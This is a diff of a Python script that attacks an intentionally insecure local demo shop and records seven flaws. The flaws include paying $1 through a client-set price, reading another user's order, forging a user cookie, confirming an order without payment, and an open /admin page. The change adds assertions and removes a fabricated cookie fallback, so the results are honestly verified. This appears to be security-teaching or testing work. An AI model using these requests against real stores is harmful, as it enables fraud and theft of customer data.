@@ -12,6 +12,7 @@ import json
 import pathlib
 import urllib.error
 import urllib.request
+from datetime import datetime, timezone
 
 BASE = "http://127.0.0.1:8010"
 OUT = pathlib.Path(__file__).resolve().parents[1] / "evidence" / "naive_shop" / "attack_results.md"
@@ -41,49 +42,63 @@ def main():
 
     # login as alice, capture the (trusted) identity cookie
     _, _, setc = req("POST", "/api/login", {"username": "alice", "password": "alice123"})
-    cookie = setc.split(";")[0] if setc else "user=alice"
+    if not setc:
+        raise RuntimeError('Login precondition failed; no fabricated cookie fallback')
+    cookie = setc.split(";")[0]
 
     # V1 - client-controlled price: pay $1 for the $1337 jacket
     code, body, _ = req("POST", "/api/checkout",
                         {"product_id": 1, "price": 1}, cookie=cookie)
     charged = json.loads(body).get("charged")
+    assert code == 200 and charged == 1
     rec("V1", "Client-controlled price", "CONFIRMED VULNERABILITY",
         f"checkout charged ${charged} for the $1337 jacket")
 
     # V2 - coupon reuse / stacking: apply SAVE20 twice
     r1 = json.loads(req("POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100})[1])
     r2 = json.loads(req("POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100})[1])
+    assert r1['new_subtotal'] == 80 and r2['new_subtotal'] == 80
     rec("V2", "Coupon reuse (no tracking)", "CONFIRMED VULNERABILITY",
         f"same coupon accepted twice: {r1['discount_percent']}% then {r2['discount_percent']}% again")
 
     # V3 - IDOR: bob reads alice's order
     oid = json.loads(req("POST", "/api/checkout", {"product_id": 1, "price": 1}, cookie=cookie)[1])["order_id"]
     code, body, _ = req("GET", f"/api/orders/{oid}", cookie="user=bob")
+    assert code == 200 and json.loads(body).get('owner') == 'alice'
     rec("V3", "IDOR (read other user's order)", "CONFIRMED VULNERABILITY",
         f"bob fetched alice's order #{oid} -> HTTP {code}, owner={json.loads(body).get('owner')!r}")
 
     # V4 - workflow bypass: confirm without paying
+    assert json.loads(body)['paid'] is False
     code, body, _ = req("GET", f"/api/confirm?order={oid}", cookie="user=bob")
+    assert json.loads(body)['order']['paid'] is True
     rec("V4", "Workflow bypass (confirm unpaid)", "CONFIRMED VULNERABILITY",
         f"order #{oid} marked paid={json.loads(body)['order']['paid']} with no payment")
 
     # V5 - client-controlled identity: forge the user cookie, no password
-    code, body, _ = req("GET", "/admin", cookie="user=whoever")
+    code, body, _ = req("POST", "/api/checkout", {'product_id':1,'price':1}, cookie="user=whoever")
+    forged_id = json.loads(body)['order_id']
+    forged = json.loads(req('GET',f'/api/orders/{forged_id}')[1])
+    assert code == 200 and forged['owner'] == 'whoever'
     rec("V5", "Client-controlled identity", "CONFIRMED VULNERABILITY",
         "the 'user' cookie is trusted unchanged; no server-side session")
 
     # V6 - no login throttling
     codes = [req("POST", "/api/login", {"username": "alice", "password": "wrong"})[0] for _ in range(8)]
+    assert codes == [401] * 8
     rec("V6", "No login throttling", "CONFIRMED VULNERABILITY",
         f"8 bad logins all returned {set(codes)} - never locked out")
 
     # V7 - broken access control: /admin open to anyone
-    code, _, _ = req("GET", "/admin")
+    code, admin_body, _ = req("GET", "/admin")
+    assert code == 200 and all(x in admin_body for x in ('alice', 'bob', 'credit'))
     rec("V7", "Broken access control (/admin open)", "CONFIRMED VULNERABILITY",
         f"GET /admin with no login -> HTTP {code} (full user table)")
 
     OUT.parent.mkdir(parents=True, exist_ok=True)
     lines = ["# Naive Shop - Attack Results (all vulnerabilities confirmed)", "",
+             f"- Timestamp: {datetime.now(timezone.utc).isoformat()}",
+             "- Assertions verify observed response/state; coupon result proves repeated discount calculation, not completed discounted purchases.",
              f"- Target: `{BASE}` (intentionally insecure demo)", "",
              "| ID | Vulnerability | Status | Detail |", "|---|---|---|---|"]
     for vid, name, status, detail in rows:
